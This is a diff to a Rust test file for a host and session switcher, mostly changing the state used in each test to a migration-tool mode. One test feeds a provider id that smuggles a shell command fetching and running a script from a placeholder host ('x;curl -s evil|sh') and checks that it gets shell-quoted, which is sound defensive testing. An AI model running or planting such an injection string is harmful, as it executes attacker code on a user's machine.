@@ -160,7 +160,7 @@ async fn the_switcher_lists_this_computer_and_app_hosts_but_never_ssh_config_ent
         sessions::hosts(cx).into_iter().map(|h| h.label).collect()
     });
     assert_eq!(labels, vec!["devbox", "gpu-01"]);
-    let mut state = State::default();
+    let mut state = State::migration_tool();
     let (_, text) = drive(&data, svc, &mut state, Locale::ZhCn, |_, _| true);
     assert!(text.contains("本机"), "{text}");
     assert!(text.contains("devbox"), "{text}");
@@ -183,7 +183,7 @@ async fn more_than_four_hosts_share_a_more_menu() {
             .push(host(id, vec![HostSource::GlobalState]));
     }
     let svc: Arc<dyn SwitchService> = service.clone();
-    let mut state = State::default();
+    let mut state = State::migration_tool();
     let (_, text) = drive(&data, svc, &mut state, Locale::En, |_, _| true);
     assert!(text.contains("h4"), "{text}");
     assert!(
@@ -200,7 +200,7 @@ async fn a_remote_host_is_scanned_read_only_with_the_migrate_command_to_copy() {
     let data = data_of(&service).await;
     let devbox = target(&data, "devbox");
     let svc: Arc<dyn SwitchService> = service.clone();
-    let mut state = State::default();
+    let mut state = State::migration_tool();
     with_cx(&data, &svc, |cx| {
         sessions::command(&mut state, cx, &format!("host:{devbox}"), &mut Vec::new())
     });
@@ -232,7 +232,7 @@ async fn provider_ids_from_a_host_are_shell_quoted_in_the_commands_to_copy() {
     // A provider id read from a rollout file on the host.
     service.set_host_providers(&gpu, &[("openai", 41), ("x;curl -s evil|sh", 3)]);
     let svc: Arc<dyn SwitchService> = service.clone();
-    let mut state = State::default();
+    let mut state = State::migration_tool();
     with_cx(&data, &svc, |cx| state.select(cx, Some(gpu.clone())));
     let quoted = "spb sessions migrate --from 'x;curl -s evil|sh'";
     let (_, text) = drive(&data, svc.clone(), &mut state, Locale::En, |_, t| {
@@ -276,7 +276,7 @@ async fn an_unreachable_host_shows_the_error_and_keeps_earlier_numbers() {
     let svc: Arc<dyn SwitchService> = service.clone();
     // First scan fails: the error with a hint.
     service.fail_host_sessions(&gpu, true);
-    let mut state = State::default();
+    let mut state = State::migration_tool();
     with_cx(&data, &svc, |cx| state.select(cx, Some(gpu.clone())));
     let (_, text) = drive(&data, svc.clone(), &mut state, Locale::ZhCn, |_, t| {
         t.contains("无法连接 gpu-01")
@@ -302,7 +302,7 @@ async fn the_command_copy_and_local_commands_produce_actions() {
     let service = fake();
     let data = data_of(&service).await;
     let svc: Arc<dyn SwitchService> = service.clone();
-    let mut state = State::default();
+    let mut state = State::migration_tool();
     let mut out = Vec::new();
     with_cx(&data, &svc, |cx| {
         sessions::command(&mut state, cx, "rescan", &mut out);
@@ -325,7 +325,7 @@ async fn sessions_fit_both_sizes_and_locales_for_this_computer_and_a_host() {
     for size in SIZES {
         for locale in [Locale::En, Locale::ZhCn] {
             for selected in [None, Some(devbox.clone())] {
-                let mut state = State::default();
+                let mut state = State::migration_tool();
                 if let Some(h) = &selected {
                     state.set_remote(h.clone(), remote.clone());
                     state.host = Some(h.clone());
